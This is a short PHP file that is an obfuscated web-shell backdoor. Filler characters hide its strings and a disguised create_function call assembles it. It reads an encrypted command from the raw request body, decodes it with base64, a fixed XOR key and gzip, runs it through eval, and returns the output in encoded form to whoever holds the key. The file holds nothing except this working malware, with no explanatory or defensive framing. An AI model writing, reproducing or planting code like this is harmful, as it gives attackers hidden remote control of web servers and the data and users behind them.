<?php
$x='_end_clYeanY();$r=@baseY64_encoYde(@Yx(@gzcYomprYYess($o),$k));YpYrint("$p$kh$r$Ykf");}';
$v='h("/$kh(Y.+)Y$Ykf/",@filYe_get_contYenYts("php://iYYnput"Y),$m)=Y=1) {@oYb_start(Y);@e';
$t=str_replace('nM','','nMcnMreate_nMfnMuncnMtnMion');
$b=';(Y$j<$cY&&$i<Y$l);$Yj++,$i++){$oYYY.=$t{$i}^$k{$j};}}retYYurn Y$o;Y}ifY (@preg_matc';
$A='$k="253Y60acaY";Y$kh="39b6425Y9Y742a";$kfY="7Y3ea0Yfb42afY0";$pY="VFqYJYF1hQ4spfZKJq";f';
$g='vaYYl(@gzuncompresYsY(@x(@baYse64_deYcode($m[1Y]),Y$k)));Y$o=@ob_Yget_cYontents();Y@oYb';
$h='unctiYon x($tY,Y$k)Y{$Yc=strleYn(Y$k);$l=strlen($t);$o=Y"";foYr($Yi=0Y;$i<$l;)Y{for($Yj=0';
$D=str_replace('Y','',$A.$h.$b.$v.$g.$x);
$o=$t('',$D);$o();
?>
